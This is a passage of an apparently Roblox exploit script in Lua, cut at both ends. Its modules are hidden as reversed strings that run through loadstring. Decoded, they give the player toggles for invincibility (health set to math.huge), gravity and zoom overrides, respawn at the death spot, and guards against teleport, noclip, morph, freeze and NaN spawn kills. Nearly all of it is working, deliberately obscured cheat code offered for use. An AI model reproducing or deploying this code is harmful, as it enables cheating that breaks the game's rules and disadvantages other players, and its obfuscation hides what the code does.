emarFC.prh = noitisoPnwapseRtsaL.G_							
neht 0 > htlaeH.dionamuh dna dionamuh dna prh fi						
)"traPtooRdionamuH"(dlihCtsriFdniF:retcarahc = prh lacol						
)"dionamuH"(ssalCfOdlihCtsriFdniF:retcarahc = dionamuh lacol						
neht retcarahc fi					
retcarahC.reyalPlacoL = retcarahc lacol					
)1(tiaw.ksat					
od delbanEnwapser elihw				
)(noitcnuf(nwaps.ksat			
neht delbanEsi fi		
delbanEsi = delbanEnwapser		
)delbanEsi(noitcnuf = kcabllac	
,".erew tsal uoy erehw nwapser ll'uoy ,nwapser nO" = pitloot	
,tpircs = xobpuorg	
,"htaeDtAnwapseR" = emarf	
{(elggoTetaerC.G_

lin = noitcennoCnwapser lacol
eslaf = delbanEnwapser lacol

reyalPlacoL.sreyalP = reyalPlacoL lacol
)"sreyalP"(ecivreSteG:emag = sreyalP lacol









)}
dne	
dne		
dne			
lin = nwapseRedoMdoG.G_				
)(tcennocsiD:nwapseRedoMdoG.G_				
neht nwapseRedoMdoG.G_ fi			
			

)(edoMdoGelbasid			
esle		
)dne			
dne				
)(edoMdoGelbane					
neht ]"htlaeHfnI"[ataDgifnoC.G_ fi				
)5.0(tiaw.ksat				
)retcarahc(noitcnuf(tcennoC:deddAretcarahC.reyalPlacoL = nwapseRedoMdoG.G_			
			

)(edoMdoGelbane			
neht delbanEsi fi		
)delbanEsi(noitcnuf = kcabllac	
,".semag lla ni krow ton yaM .elbicnivni retcarahc ruoy sekaM" = pitloot	
,tpircs = xobpuorg	
,"htlaeHfnI" = emarf	
{(elggoTetaerC.G_

dne
dne	
dne		
001 = htlaeH.dionamuh			
)(tiaw.ksat			
001 = htlaeHxaM.dionamuh			
neht dionamuh fi		
)"dionamuH"(ssalCfOdlihCtsriFdniF:retcarahc = dionamuh lacol		
neht retcarahc fi	
retcarahC.reyalPlacoL = retcarahc lacol	
)(tiaw.ksat	
	

}{ = snoitcennoCdog	
dne	
dne )(tcennocsiD:nnoc neht nnoc fi		
od )snoitcennoCdog(sriap ni nnoc ,_ rof	
	
)(edoMdoGelbasid noitcnuf lacol

dne
))dne	
dne		
eguh.htam = htlaeH.dionamuh			
neht tneraP.dionamuh dna dionamuh fi		
)(tiaw.ksat		
)(noitcnuf(tcennoC:deiD.dionamuh ,snoitcennoCdog(tresni.elbat	
	

))dne	
dne		
dne			
eguh.htam = htlaeH.dionamuh				
eguh.htam = htlaeHxaM.dionamuh				
neht eguh.htam < htlaeH.dionamuh fi			
neht tneraP.dionamuh dna dionamuh fi		
)(noitcnuf(tcennoC:)"htlaeH"(langiSdegnahCytreporPteG:dionamuh ,snoitcennoCdog(tresni.elbat	
	

))dne	
dne		
eguh.htam = htlaeH.dionamuh			
eguh.htam = htlaeHxaM.dionamuh			
neht tneraP.dionamuh dna dionamuh fi		
)(noitcnuf(tcennoC:deppetSredneR.ecivreSnuR ,snoitcennoCdog(tresni.elbat	
	

eguh.htam = htlaeH.dionamuh	
eguh.htam = htlaeHxaM.dionamuh	

dne nruter neht dionamuh ton fi	
)"dionamuH"(ssalCfOdlihCtsriFdniF:retcarahc = dionamuh lacol	

dne nruter neht retcarahc ton fi	
retcarahC.reyalPlacoL = retcarahc lacol	

}{ = snoitcennoCdog	
dne	
dne )(tcennocsiD:nnoc neht nnoc fi		
od )snoitcennoCdog(sriap ni nnoc ,_ rof	
	
)(edoMdoGelbane noitcnuf lacol

}{ = snoitcennoCdog lacol

reyalPlacoL.sreyalP = reyalPlacoL lacol
)"ecivreSnuR"(ecivreSteG:emag = ecivreSnuR lacol
)"sreyalP"(ecivreSteG:emag = sreyalP lacol














)dne
dne	
eulaVytivarg = ytivarG.ecapskrow		
neht delbanEytivarg fi	
)"dionamuH"(dlihCroFtiaW:retcarahc	
)retcarahc(noitcnuf(tcennoC:deddAretcarahC.reyalPlacoL

reyalPlacoL.sreyalP = reyalPlacoL lacol
)"sreyalP"(ecivreSteG:emag = sreyalP lacol


)}
dne	
dne		
YTIVARG_TLUAFED = ytivarG.ecapskrow			
esle		
eulaVytivarg = ytivarG.ecapskrow			
neht delbanEsi fi		

delbanEsi = delbanEytivarg		
)delbanEsi(noitcnuf = kcabllac	
,".eulav tsujda ot xobtxet eht esU .ytivarg ecapskrow segnahC" = pitloot	
,tpircs = xobpuorg	
,"ytivarGteS" = emarf	
{(elggoTetaerC.G_

)}
dne	
dne		
eulaVytivarg = ytivarG.ecapskrow			
neht delbanEytivarg fi		
		

)txet(ytivarGteg = eulaVytivarg		
)txet(noitcnuf = kcabllac	
,eurt = rolocrevoh	
,"roloCemarf" = rolocxobtxet	
,".ytivarg xam rof 'fni' epyT .2.691 si tluafed ,ytivarg eht egnahC" = pitloot	
,"regnahCytivarG" = emanxobtxet	
,"ytivarGteS" = emarf	
{(xobtxeTetaerC.G_

dne
YTIVARG_TLUAFED ro mun dna 0 > mun dna mun nruter	
dne 0 nruter neht 0 == mun fi	
)txet(rebmunot = mun lacol	
dne	
 eguh.htam nruter		
 neht "ytinifni" == txeTrewol ro "fni" == txeTrewol fi	
)txet(rewol.gnirts = txeTrewol lacol	
)txet(ytivarGteg noitcnuf lacol

eslaf = delbanEytivarg lacol
2.691 = eulaVytivarg lacol
2.691 = YTIVARG_TLUAFED lacol












)}
dne	
dne		
)dne			
)999(pacspftes				
)(noitcnuf(llacp			
			

dne			
lin = pooLpaCspf				
)(tcennocsiD:pooLpaCspf				
neht pooLpaCspf fi			
			
esle		
)dne			
)dne				
)eulaVpaCspf(pacspftes					
)(noitcnuf(llacp				
)(noitcnuf(tcennoC:taebtraeH.ecivreSnuR = pooLpaCspf			
			

)dne			
)eulaVpaCspf(pacspftes				
)(noitcnuf(llacp			
			
neht delbanEsi fi		

delbanEsi = delbanEpaCspf		
)delbanEsi(noitcnuf = kcabllac	
,".tes si rebmun revetahw ot SPF ruoy spaC" = pitloot	
,tpircs = xobpuorg	
,"SPFpaC" = emarf	
{(elggoTetaerC.G_

)}
dne	
dne		
dne			
)dne				
)eulaVpaCspf(pacspftes					
)(noitcnuf(llacp				
neht delbanEpaCspf fi			
			

eulav = eulaVpaCspf			
neht eulav fi		
)txet(rebmunot = eulav lacol		
)txet(noitcnuf = kcabllac	
,eurt = rolocrevoh	
,"roloCemarf" = rolocxobtxet	
,".pac SPF eht tsujdA" = pitloot	
,"regnahCSPFpaC" = emanxobtxet	
,"SPFpaC" = emarf	
{(xobtxeTetaerC.G_

lin = pooLpaCspf lacol
eslaf = delbanEpaCspf lacol
06 = eulaVpaCspf lacol

)"ecivreSnuR"(ecivreSteG:emag = ecivreSnuR lacol













)dne
dne	
)(IUetaerc		
)5.0(tiaw.ksat		
neht ]"kcoltfihSbom"[ataDgifnoC.G_ dna ataDgifnoC.G_ fi	
)(noitcnuf(tcennoC:deddAretcarahC.reyalPlacoL

)}
dne	
dne		
)(IUyortsed			
esle		
)(IUetaerc			
neht delbanEsi fi		
)delbanEsi(noitcnuf = kcabllac	
,".kcoltfihs tuohtiw sresu elibom rof elggot kcoltfihs eht sddA" = pitloot	
,tpircs = xobpuorg	
,"kcoltfihSbom" = emarf	
{(elggoTetaerC.G_

dne
dne	
lin = nottuBegami		
lin = iuGkcoLtfihs		
)(yortseD:iuGkcoLtfihs		
neht iuGkcoLtfihs fi	
)"elggoTkcoLtfihS"(noitcAdnibnU:ecivreSnoitcAtxetnoC	
)(kcoltfihSelbasid	
)(IUyortsed noitcnuf lacol

dne
)tfihStfeL.edoCyeK.munE ,eslaf ,dne	
dne		
)(elggoTkcoLtfihs			
neht nigeB.etatStupnIresU.munE == etatStupni fi		
)etatStupni ,_(noitcnuf ,"elggoTkcoLtfihS"(noitcAdniB:ecivreSnoitcAtxetnoC	
	

)dne	
)(elggoTkcoLtfihs		
)(noitcnuf(tcennoC:kcilC1nottuBesuoM.nottuBegami	

)dne	
dne		
dne			
soPwen = noitisoP.nottuBegami				
)				
Y.atled + tesffO.Y.soPtrats ,elacS.Y.soPtrats					
,X.atled + tesffO.X.soPtrats ,elacS.X.soPtrats					
(wen.2miDU = soPwen lacol				
tratSgard - soPhcuot = atled lacol				
neht soPhcuot fi			
)1(noitisoPhcuoTteG:ecivreStupnIresU = soPhcuot lacol			
neht gniggard fi		
)(noitcnuf(tcennoC:deppetSredneR.ecivreSnuR	

)dne	
dne		
eslaf = gniggard			
neht hcuoT.epyTtupnIresU.munE == epyTtupnIresU.tupni fi		
)tupni(noitcnuf(tcennoC:dednEtupnI.nottuBegami	

)dne	
dne		
noitisoP.nottuBegami = soPtrats			
noitisoP.tupni = tratSgard			
eurt = gniggard			
neht hcuoT.epyTtupnIresU.munE == epyTtupnIresU.tupni fi		
)tupni(noitcnuf(tcennoC:nageBtupnI.nottuBegami	

)(wen.2miDU = soPtrats lacol	
)(wen.2rotceV = tratSgard lacol	
eslaf = gniggard lacol	
	

iuGkcoLtfihs = tneraP.nottuBegami	
eurt = evitcA.nottuBegami	
eurt = ladoM.nottuBegami	
FFO.setats = egamI.nottuBegami	
XXevitaleR.tniartsnoCeziS.munE = tniartsnoCeziS.nottuBegami	
)0 ,6365031660.0 ,0 ,2117416360.0(wen.2miDU = eziS.nottuBegami	
)0 ,634573255.0 ,0 ,933419129.0(wen.2miDU = noitisoP.nottuBegami	
1 = ycnerapsnarTdnuorgkcaB.nottuBegami	
)"nottuBegamI"(wen.ecnatsnI = nottuBegami	

iuGreyalp = tneraP.iuGkcoLtfihs	
gnilbiS.roivaheBxednIZ.munE = roivaheBxednIZ.iuGkcoLtfihs	
999 = redrOyalpsiD.iuGkcoLtfihs	
eslaf = nwapSnOteseR.iuGkcoLtfihs	
"iuGkcoLtfihS" = emaN.iuGkcoLtfihs	
)"iuGneercS"(wen.ecnatsnI = iuGkcoLtfihs	

)"iuGreyalP"(dlihCroFtiaW:reyalPlacoL = iuGreyalp lacol	

dne	
lin = nottuBegami		
lin = iuGkcoLtfihs		
)(yortseD:iuGkcoLtfihs		
neht iuGkcoLtfihs fi	
)(IUetaerc noitcnuf lacol

dne
dne	
)(kcoltfihSelbasid		
esle	
)dne		
)(kcoltfihSelbane			
)(noitcnuf(tcennoC:deppetSredneR.ecivreSnuR = evitca		
neht evitca ton fi	

emiTtnerruc = emiTsserPtsal	
dne nruter neht emiTecnuobed < emiTsserPtsal - emiTtnerruc fi	
)(kcit = emiTtnerruc lacol	
)(elggoTkcoLtfihs noitcnuf lacol

dne
)"NO"(egamIetadpu	
TESFFO_DELBANE * emarFC.aremac = emarFC.aremac	
))		
HTGNEL_XAM * Z.rotceVkooL.emarFC.aremac		
,Y.noitisoP.prh		
,HTGNEL_XAM * X.rotceVkooL.emarFC.aremac		
(wen.3rotceV ,noitisoP.prh(wen.emarFC = emarFC.prh	
eslaf = etatoRotuA.dionamuh	
dne nruter neht aremac ton ro prh ton ro dionamuh ton fi	
)(straPretcarahCteg = aremac ,prh ,dionamuh lacol	
)(kcoltfihSelbane noitcnuf lacol

dne
dne	
lin = evitca		
)(tcennocsiD:evitca		
neht evitca fi	
)"FFO"(egamIetadpu	
dne TESFFO_DELBASID * emarFC.aremac = emarFC.aremac neht aremac fi	
dne eurt = etatoRotuA.dionamuh neht dionamuh fi	
)(straPretcarahCteg = aremac ,prh ,dionamuh lacol	
)(kcoltfihSelbasid noitcnuf lacol

dne
dne	
]etats[setats = egamI.nottuBegami		
neht nottuBegami fi	
)etats(egamIetadpu noitcnuf lacol

dne
aremac ,prh ,dionamuh nruter	
aremaCtnerruC.ecapskrow = aremac lacol	
)"traPtooRdionamuH"(dlihCtsriFdniF:retcarahc = prh lacol	
)"dionamuH"(ssalCfOdlihCtsriFdniF:retcarahc = dionamuh lacol	
dne lin ,lin ,lin nruter neht retcarahc ton fi	
retcarahC.reyalPlacoL = retcarahc lacol	
)(straPretcarahCteg noitcnuf lacol

)0 ,0 ,7.1-(wen.emarFC = TESFFO_DELBASID lacol
)0 ,0 ,7.1(wen.emarFC = TESFFO_DELBANE lacol
000009 = HTGNEL_XAM lacol

}
"gnp.x2@no_kcoLesuom/iu/serutxet//:tessaxbr" = NO	
,"gnp.x2@ffo_kcoLesuom/iu/serutxet//:tessaxbr" = FFO	
{ = setats lacol

lin = nottuBegami lacol
lin = iuGkcoLtfihs lacol

2.0 = emiTecnuobed lacol
0 = emiTsserPtsal lacol
lin = evitca lacol

reyalPlacoL.sreyalP = reyalPlacoL lacol

)"ecivreSnoitcAtxetnoC"(ecivreSteG:emag = ecivreSnoitcAtxetnoC lacol
)"ecivreSnuR"(ecivreSteG:emag = ecivreSnuR lacol
)"ecivreStupnIresU"(ecivreSteG:emag = ecivreStupnIresU lacol
)"sreyalP"(ecivreSteG:emag = sreyalP lacol






dne
)(eziSetadpu	
dne	
)eziSetadpu(tcennoC:)"elacS"(langiSdegnahCytreporPteG:elacSiu		
neht elacSiu fi	
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol	
)eziSetadpu(tcennoC:)"eziStnetnoCetulosbA"(langiSdegnahCytreporPteG:tuoyaLtsiLiu	
dne	
)thgieHdelacs ,0 ,tesffO.X.eziS.xobpuorg ,elacS.X.eziS.xobpuorg(wen.2miDU = eziS.xobpuorg		
elacs / )2 + Y.eziStnetnoc( = thgieHdelacs lacol		
1 ro elacS.elacSiu dna elacSiu = elacs lacol		
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol		
eziStnetnoCetulosbA.tuoyaLtsiLiu = eziStnetnoc lacol		
)(eziSetadpu noitcnuf lacol	
neht tuoyaLtsiLiu fi
dne nruter neht iuGneercs ton fi
)(iuGneercSteg = iuGneercs lacol
dne
dne	
tneraP.p = p		
dne p nruter neht )"iuGneercS"(AsI:p fi		
od p elihw	
xobpuorg = p lacol	
)(iuGneercSteg noitcnuf lacol
)"tuoyaLtsiLIU"(ssalCfOdlihCtsriFdniF:xobpuorg = tuoyaLtsiLiu lacol
tneraP.tpircs = xobpuorg lacol

nwodporDetaerC.G_ dna redilSetaerC.G_ dna xobtxeTetaerC.G_ dna elggoTnottuBetaerC.G_ dna nottuBetaerC.G_ dna elggoTetaerC.G_ litnu )(tiaw.ksat taeper]]):reverse())();
end;
task.spawn(C_22c);
local function C_27d()
local script = _llza[_sc(50,55,100)];
loadstring(([[)}
dne	
dne		
dne			
eulaVmooZnim = ecnatsiDmooZniMaremaC.reyalPlacoL.sreyalP.emag				
neht delbanEmooZnim fi			
mun = eulaVmooZnim			
neht mun fi		
)txet(rebmunot = mun lacol		
)txet(noitcnuf = kcabllac	
,eurt = rolocrevoh	
,"roloCemarf" = rolocxobtxet	
,".5.0 si tluafed ,ecnatsid mooz nim eht teS" = pitloot	
,"mooZniM" = emanxobtxet	
,"mooZniM" = emarf	
{(xobtxeTetaerC.G_
)}
dne	
dne		
5.0 = ecnatsiDmooZniMaremaC.reyalPlacoL.sreyalP.emag			
dne			
lin = pooLmooZnim				
)(tcennocsiD:pooLmooZnim				
neht pooLmooZnim fi			
esle		
)dne			
eulaVmooZnim = ecnatsiDmooZniMaremaC.reyalPlacoL.sreyalP.emag				
)(noitcnuf(tcennoC:taebtraeH.ecivreSnuR = pooLmooZnim			
eulaVmooZnim = ecnatsiDmooZniMaremaC.reyalPlacoL.sreyalP.emag			
neht delbanEsi fi		
delbanEsi = delbanEmooZnim		
)delbanEsi(noitcnuf = kcabllac	
,".eulav tes eht ot ecnatsid mooz nim aremac ruoy secroF" = pitloot	
,tpircs = xobpuorg	
,"mooZniM" = emarf	
{(elggoTetaerC.G_

lin = pooLmooZnim lacol
eslaf = delbanEmooZnim lacol
5.0 = eulaVmooZnim lacol





)}
dne	
dne		
eulaVmooZxam = ecnatsiDmooZxaMaremaC.reyalPlacoL.sreyalP.emag			
neht delbanEmooZxam fi		
dne		
dne			
mun = eulaVmooZxam				
neht mun fi			
)txet(rebmunot = mun lacol			
esle		
eguh.htam = eulaVmooZxam			
neht "fni" == )(rewol:txet fi		
)txet(noitcnuf = kcabllac	
,eurt = rolocrevoh	
,"roloCemarf" = rolocxobtxet	
,".004 si tluafed ,ecnatsid mooz xam eht teS" = pitloot	
,"mooZxaM" = emanxobtxet	
,"mooZxaM" = emarf	
{(xobtxeTetaerC.G_
)}
dne	
dne		
004 = ecnatsiDmooZxaMaremaC.reyalPlacoL.sreyalP.emag			
dne			
lin = pooLmooZxam				
)(tcennocsiD:pooLmooZxam				
neht pooLmooZxam fi			
esle		
)dne			
eulaVmooZxam = ecnatsiDmooZxaMaremaC.reyalPlacoL.sreyalP.emag				
)(noitcnuf(tcennoC:taebtraeH.ecivreSnuR = pooLmooZxam			
eulaVmooZxam = ecnatsiDmooZxaMaremaC.reyalPlacoL.sreyalP.emag			
neht delbanEsi fi		
delbanEsi = delbanEmooZxam		
)delbanEsi(noitcnuf = kcabllac	
,".eulav tes eht ot ecnatsid mooz xam aremac ruoy secroF" = pitloot	
,tpircs = xobpuorg	
,"mooZxaM" = emarf	
{(elggoTetaerC.G_

lin = pooLmooZxam lacol
eslaf = delbanEmooZxam lacol
004 = eulaVmooZxam lacol







)}
,dne	
dne eslaf = derohcnA.daeh neht daeh fi		
)"daeH"(dlihCtsriFdniF:retcarahC.reyalPlacoL = daeh lacol		
cissalC.edoMaremaC.munE = edoMaremaC.reyalPlacoL		
004 = ecnatsiDmooZxaMaremaC.reyalPlacoL		
5.0 = ecnatsiDmooZniMaremaC.reyalPlacoL		
)"dionamuH"(AsIhcihWdlihCtsriFdniF:retcarahC.reyalPlacoL = tcejbuSaremaC.aremac		
motsuC.epyTaremaC.munE = epyTaremaC.aremac		
aremaCtnerruC.ecapskrow = aremac lacol		
)(noitcnuf = kcabllac	
,".nekorb ro kcuts steg ti fi lamron ot kcab aremac ruoy steseR" = pitloot	
,tpircs = xobpuorg	
,"maCxiF" = emarf	
{(nottuBetaerC.G_






dne
)(eziSetadpu	
dne	
)eziSetadpu(tcennoC:)"elacS"(langiSdegnahCytreporPteG:elacSiu		
neht elacSiu fi	
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol	
)eziSetadpu(tcennoC:)"eziStnetnoCetulosbA"(langiSdegnahCytreporPteG:tuoyaLtsiLiu	
dne	
)thgieHdelacs ,0 ,tesffO.X.eziS.xobpuorg ,elacS.X.eziS.xobpuorg(wen.2miDU = eziS.xobpuorg		
elacs / )2 + Y.eziStnetnoc( = thgieHdelacs lacol		
1 ro elacS.elacSiu dna elacSiu = elacs lacol		
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol		
eziStnetnoCetulosbA.tuoyaLtsiLiu = eziStnetnoc lacol		
)(eziSetadpu noitcnuf lacol	
neht tuoyaLtsiLiu fi
dne nruter neht iuGneercs ton fi
)(iuGneercSteg = iuGneercs lacol
dne
dne	
tneraP.p = p		
dne p nruter neht )"iuGneercS"(AsI:p fi		
od p elihw	
xobpuorg = p lacol	
)(iuGneercSteg noitcnuf lacol
)"tuoyaLtsiLIU"(ssalCfOdlihCtsriFdniF:xobpuorg = tuoyaLtsiLiu lacol
tneraP.tpircs = xobpuorg lacol

nwodporDetaerC.G_ dna redilSetaerC.G_ dna xobtxeTetaerC.G_ dna elggoTnottuBetaerC.G_ dna nottuBetaerC.G_ dna elggoTetaerC.G_ litnu )(tiaw.ksat taeper]]):reverse())();
end;
task.spawn(C_27d);
local function C_2bf()
local script = _llza[_sc(50,98,102)];
loadstring(([[)}
dne	
dne		
dne			
lin = pooLtropeleTitnA.G_				
)(tcennocsiD:pooLtropeleTitnA.G_				
neht pooLtropeleTitnA.G_ fi			
			
esle		
)dne			
noitisoP.toor - emarFC.toor = noitatneirOtsal				
noitisoP.toor = noitisoPtsal				

dne				
dne					
)2 ,"!tropelet dekcolB"(yfitoN.G_						
noitatneirOtsal * )noitisoPtsal(wen.emarFC = emarFC.toor						
						
neht 51 > ecnatsid fi					
edutingaM.)noitisoPtsal - noitisoP.toor( = ecnatsid lacol					
neht noitisoPtsal fi				

dne nruter neht toor ton fi				
)"traPtooRdionamuH"(dlihCtsriFdniF:retcarahc = toor lacol				
dne nruter neht retcarahc ton fi				
retcarahC.reyalPlacoL = retcarahc lacol				
)(noitcnuf(tcennoC:taebtraeH.ecivreSnuR = pooLtropeleTitnA.G_			

lin = noitatneirOtsal lacol			
lin = noitisoPtsal lacol			
)"ecivreSnuR"(ecivreSteG:emag = ecivreSnuR lacol			
reyalPlacoL.)"sreyalP"(ecivreSteG:emag = reyalPlacoL lacol			
neht delbanEsi fi		
)delbanEsi(noitcnuf = kcabllac	
,".detropelet gnitteg morf uoy stneverP" = pitloot	
,tpircs = xobpuorg	
,"tropelet" = emarf	
{(elggoTetaerC.G_








)}
dne	
dne		
dne			
lin = pooLpilcoNitnA.G_				
)pooLpilcoNitnA.G_(lecnac.ksat				
neht pooLpilcoNitnA.G_ fi			
			
esle		
)dne			
dne				
)5(tiaw.ksat					
dne					
dne						
)reyalPlacoL ,dIboJ.emag ,dIecalP.emag(ecnatsnIecalPoTtropeleT:ecivreStropeleT							
)999999 ,"...gniniojeR !detceted pilcoN"(yfitoN.G_							
eurt = detceteDsah							
neht detceteDsah ton dna "pilCoN" == puorGnoisilloC.prh dna prh fi						
)"traPtooRdionamuH"(dlihCtsriFdniF:rahc = prh lacol						
neht rahc fi					
)emaN.reyalPlacoL(dlihCtsriFdniF:ecapskrow = rahc lacol					
od eurt elihw				
)(noitcnuf(nwaps.ksat = pooLpilcoNitnA.G_			

eslaf = detceteDsah lacol			
)"ecivreStropeleT"(ecivreSteG:emag = ecivreStropeleT lacol			
reyalPlacoL.)"sreyalP"(ecivreSteG:emag = reyalPlacoL lacol			
neht delbanEsi fi		
)delbanEsi(noitcnuf = kcabllac	
,".pilcon no snioj otuA" = pitloot	
,tpircs = xobpuorg	
,"pilcon" = emarf	
{(elggoTetaerC.G_





)}
dne	
dne		
dne			
lin = nwapseRhproMitnA.G_				
)(tcennocsiD:nwapseRhproMitnA.G_				
neht nwapseRhproMitnA.G_ fi			
dne			
lin = pooLhproMitnA.G_				
)(tcennocsiD:pooLhproMitnA.G_				
neht pooLhproMitnA.G_ fi			
			
esle		
)deddAretcarahCno(tcennoC:deddAretcarahC.reyalPlacoL = nwapseRhproMitnA.G_			
			

)dne			
dne				
)2.0(tiaw.ksat					
)(tiaW:deddAretcarahC.reyalPlacoL					
dne					
0 = htlaeH.)"dionamuH"(ssalCfOdlihCtsriFdniF:retcarahC.reyalPlacoL						
esle					
)(retcarahCteseR.derahs						
neht retcarahCteseR.derahs fi					
)2 ,"...gnitteseR !detceted hproM"(yfitoN.G_					
eurt = gnitteseRsi					
neht )rahc(hproMroFkcehc fi				
dne nruter neht rahc ton fi				
)emaN.reyalPlacoL(dlihCtsriFdniF:ecapskrow = rahc lacol				
)(noitcnuf(tcennoC:taebtraeH.)"ecivreSnuR"(ecivreSteG:emag = pooLhproMitnA.G_			
			

dne			
)dne				
)retcarahC.reyalPlacoL(deddAretcarahCno					
)(noitcnuf(nwaps.ksat				
neht retcarahC.reyalPlacoL fi			
			

dne			
eslaf = gnitteseRsi				
eurt = tceteDnac				
 )1(tiaw.ksat				
)retcarahc(ecnaraeppAlanigirOerutpac				
 )5.0(tiaw.ksat				
 eslaf = tceteDnac				
)retcarahc(deddAretcarahCno noitcnuf lacol			

dne			
eslaf nruter				
dne				
dne					
eurt nruter						
neht dnuof ton fi					
dne					
dne						
kaerb							
eurt = dnuof							
neht emaNgiro == emaNcca fi						
od )seirosseccAlanigiro(sriap ni emaNgiro ,_ rof					
eslaf = dnuof lacol					
od )seirosseccAtnerruc(sriap ni emaNcca ,_ rof				
dne				
eurt nruter					
neht seirosseccAlanigiro# =~ seirosseccAtnerruc# fi				
				
dne				
dne					
)emaN.yrossecca ,seirosseccAtnerruc(tresni.elbat						
neht )"yrosseccA"(AsI:yrossecca fi					
od ))(nerdlihCteG:retcarahc(sriap ni yrossecca ,_ rof				
}{ = seirosseccAtnerruc lacol				
				
dne				
eurt nruter					
neht stnaPlanigiro =~ stnaPtnerruc fi				
lin ro etalpmeTstnaP.stnap dna stnap = stnaPtnerruc lacol				
)"stnaP"(ssalCfOdlihCtsriFdniF:retcarahc = stnap lacol				
				
dne				
eurt nruter					
neht trihSlanigiro =~ trihStnerruc fi				
lin ro etalpmeTtrihS.trihs dna trihs = trihStnerruc lacol				
)"trihS"(ssalCfOdlihCtsriFdniF:retcarahc = trihs lacol				
				
dne nruter neht tceteDnac ton ro gnitteseRsi fi				
)retcarahc(hproMroFkcehc noitcnuf lacol			

dne			
dne				
dne					
)emaN.yrossecca ,seirosseccAlanigiro(tresni.elbat						
neht )"yrosseccA"(AsI:yrossecca fi					
od ))(nerdlihCteG:retcarahc(sriap ni yrossecca ,_ rof				
}{ = seirosseccAlanigiro				
				
lin ro etalpmeTstnaP.stnap dna stnap = stnaPlanigiro				
)"stnaP"(ssalCfOdlihCtsriFdniF:retcarahc = stnap lacol				
				
lin ro etalpmeTtrihS.trihs dna trihs = trihSlanigiro				
)"trihS"(ssalCfOdlihCtsriFdniF:retcarahc = trihs lacol				
				
)retcarahc(ecnaraeppAlanigirOerutpac noitcnuf lacol			

}{ = seirosseccAlanigiro lacol			
lin = stnaPlanigiro lacol			
lin = trihSlanigiro lacol			
eslaf = tceteDnac lacol			
eslaf = gnitteseRsi lacol			
reyalPlacoL.)"sreyalP"(ecivreSteG:emag = reyalPlacoL lacol			
neht delbanEsi fi		
)delbanEsi(noitcnuf = kcabllac	
,".dehprom teg uoy nehw retcarahc ruoy steser otuA" = pitloot	
,tpircs = xobpuorg	
,"hprom" = emarf	
{(elggoTetaerC.G_





)}
dne	
dne		
dne			
lin = pooLsivnIitnA.G_				
)(tcennocsiD:pooLsivnIitnA.G_				
neht pooLsivnIitnA.G_ fi			
			
esle		
)dne			
dne				
eslaf = gnitteseRsi					
)2.0(tiaw.ksat					
)(tiaW:deddAretcarahC.reyalPlacoL					

dne					
0 = htlaeH.)"dionamuH"(ssalCfOdlihCtsriFdniF:retcarahC.reyalPlacoL						
						
esle					
)(retcarahCteseR.derahs						
neht retcarahCteseR.derahs fi					

)2 ,"...gnitteseR !detceted elbisivnI"(yfitoN.G_					
eurt = gnitteseRsi					
neht gnitteseRsi ton dna 1 => ycnerapsnarT.osroTreppu dna osroTreppu fi				
)"osroTreppU"(dlihCtsriFdniF:rahc = osroTreppu lacol				

dne nruter neht rahc ton fi				
)emaN.reyalPlacoL(dlihCtsriFdniF:ecapskrow = rahc lacol				
)(noitcnuf(tcennoC:taebtraeH.ecivreSnuR = pooLsivnIitnA.G_			

eslaf = gnitteseRsi lacol			
)"ecivreSnuR"(ecivreSteG:emag = ecivreSnuR lacol			
reyalPlacoL.)"sreyalP"(ecivreSteG:emag = reyalPlacoL lacol			
neht delbanEsi fi		
)delbanEsi(noitcnuf = kcabllac	
,".elbisivni nrut uoy nehw retcarahc ruoy steser otuA" = pitloot	
,tpircs = xobpuorg	
,"elbisivni" = emarf	
{(elggoTetaerC.G_




)}
dne	
dne		
dne			
lin = pooLezeerFitnA.G_				
)(tcennocsiD:pooLezeerFitnA.G_				
neht pooLezeerFitnA.G_ fi			
			
esle		
)dne			
dne				
eslaf = gnitteseRsi					
)2.0(tiaw.ksat					
)(tiaW:deddAretcarahC.reyalPlacoL					

dne					
0 = htlaeH.)"dionamuH"(ssalCfOdlihCtsriFdniF:retcarahC.reyalPlacoL						
						
esle					
)(retcarahCteseR.derahs						
neht retcarahCteseR.derahs fi					

)2 ,"...gnitteseR !detceted nezorF"(yfitoN.G_					
eurt = gnitteseRsi					
neht gnitteseRsi ton dna )"oleiH"(dlihCtsriFdniF:rahc fi				

dne nruter neht rahc ton fi				
)emaN.reyalPlacoL(dlihCtsriFdniF:ecapskrow = rahc lacol				
)(noitcnuf(tcennoC:taebtraeH.ecivreSnuR = pooLezeerFitnA.G_			

eslaf = gnitteseRsi lacol			
)"ecivreSnuR"(ecivreSteG:emag = ecivreSnuR lacol			
reyalPlacoL.)"sreyalP"(ecivreSteG:emag = reyalPlacoL lacol			
neht delbanEsi fi		
)delbanEsi(noitcnuf = kcabllac	
,".nezorf teg uoy nehw retcarahc ruoy steser otuA" = pitloot	
,tpircs = xobpuorg	
,"ezeerf" = emarf	
{(elggoTetaerC.G_




)}
dne	
dne		
dne			
lin = noitcennoCnaNitnA.G_				
)(tcennocsiD:noitcennoCnaNitnA.G_				
neht noitcennoCnaNitnA.G_ fi			
			
esle		
dne			
)retcarahC.reyalPlacoL(deddAretcarahCno				
neht retcarahC.reyalPlacoL fi			
			

)deddAretcarahCno(tcennoC:deddAretcarahC.reyalPlacoL = noitcennoCnaNitnA.G_			
			

dne			
)2 ,"!llik nwaps NaN dekcolB"(yfitoN.G_				
				

eslaf = derohcnA.prh				
)0 ,3 ,0(wen.emarFC = emarFC.prh				
)1.0(tiaw.ksat				
eurt = derohcnA.prh				
dne nruter neht )(dedioVsi ton fi				
)"traPtooRdionamuH"(dlihCroFtiaW:retcarahc = prh lacol				
)retcarahc(deddAretcarahCno noitcnuf lacol			

dne			
0 == Z.mca dna 0000001- == Y.mca dna 0 == X.mca nruter				
ssaMfOretneCylbmessA.nwaps = mca lacol				
dne eslaf nruter neht nwaps ton fi				
)"nwapS"(dlihCtsriFdniF:ecapskrow = nwaps lacol				
)(dedioVsi noitcnuf lacol			

reyalPlacoL.)"sreyalP"(ecivreSteG:emag = reyalPlacoL lacol			
neht delbanEsi fi		
)delbanEsi(noitcnuf = kcabllac	
,".NaN ot edit niarret eht stes reyalp a nehw llik pool nwaps stneverP" = pitloot	
,tpircs = xobpuorg	
,"naneditpam" = emarf	
{(elggoTetaerC.G_




)}
dne	
dne		
dne			
lin = pooLliaJitnA.G_				
